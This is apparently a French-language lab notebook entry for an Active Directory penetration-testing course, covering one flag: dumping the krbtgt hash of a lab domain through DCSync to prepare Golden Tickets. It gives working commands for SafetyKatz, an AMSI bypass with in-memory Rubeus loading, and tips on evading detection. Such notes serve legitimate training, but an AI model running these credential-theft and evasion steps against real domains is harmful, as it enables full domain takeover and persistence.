---
flag: 16
machine: dcorp-dc
statut: à faire
technique: DCSync
LO: "[[LO08 - DCSync et Golden ticket]]"
---
# F16 · NTLM de krbtgt

> [!summary] Objectif
> Extraire le hash NTLM (et clé AES256) de `krbtgt` du domaine `dollarcorp.moneycorp.local` via DCSync.

## Contexte
- **Étape attack flow** : LO8 — DA obtenu (via svcadmin OverPass-the-Hash de LO7), on prépare le **Golden Ticket** (clé krbtgt = maître du KDC).
- **Ce qu'on a** : TGT `svcadmin` (DA) injecté → droits de réplication implicites sur `dollarcorp.moneycorp.local`.
- **Ce qu'on cherche** : `krbtgt` NTLM (`rc4_hmac`) + AES256 pour forger Golden/Diamond (voir [[Cheatsheet - Tickets Kerberos]]).

## Solution

### Étape 1 : vérifier le contexte DA
```powershell
klist
dir \\dcorp-dc.dollarcorp.moneycorp.local\C$   # doit passer = DA effectif
```

### Étape 2 : DCSync sur krbtgt
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dollarcorp\krbtgt" "exit"
```
→ Voir [[Cheatsheet - Persistence]] (mécanique DCSync) et [[Cheatsheet - Tickets Kerberos]] (usage Golden).

### Alternative Rubeus (in-memory, si SafetyKatz bloqué)
```powershell
iex (Get-Content C:\AD\Tools\Amsi-Byp.txt -Raw)
$a = [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("C:\AD\Tools\Rubeus.exe"))
$a.EntryPoint.Invoke($null, @(,[string[]]@("dcsync","/user:dollarcorp\krbtgt")))
```

## Réponse

| Élément | Valeur |
|---------|--------|
| krbtgt NTLM (`rc4_hmac`) | A REMPLIR DEPUIS LAB |
| krbtgt AES256 (`aes256_hmac`) | A REMPLIR DEPUIS LAB |
| Domain SID `dollarcorp` | A REMPLIR DEPUIS LAB |

## Pièges et OPSEC
- DCSync = replication trafic `DsGetNCChanges` visible sur DC (Event 4662 avec GUID `1131f6aa/1131f6ad/89e95b76`). Bruyant si MDI présent.
- Ne jamais confondre `krbtgt` de `dollarcorp` (ici, F16) avec celui de `moneycorp.local` (F30, forêt racine).
- Un reset ×2 du mot de passe `krbtgt` invalide les Golden — noter la clé AES immédiatement.
- La clé AES256 est préférée au NTLM pour forger (`/rc4` = downgrade détectable, event 4769 encryption type anormal — voir [[Synthèse - Kerberos]]).

## Refs
- [[Cheatsheet - Persistence]]
- [[Cheatsheet - Tickets Kerberos]]
- [[Synthèse - Kerberos]]
- [[LO08 - DCSync et Golden ticket]]

[[Flags - Index]] · [[Journal - Index]]
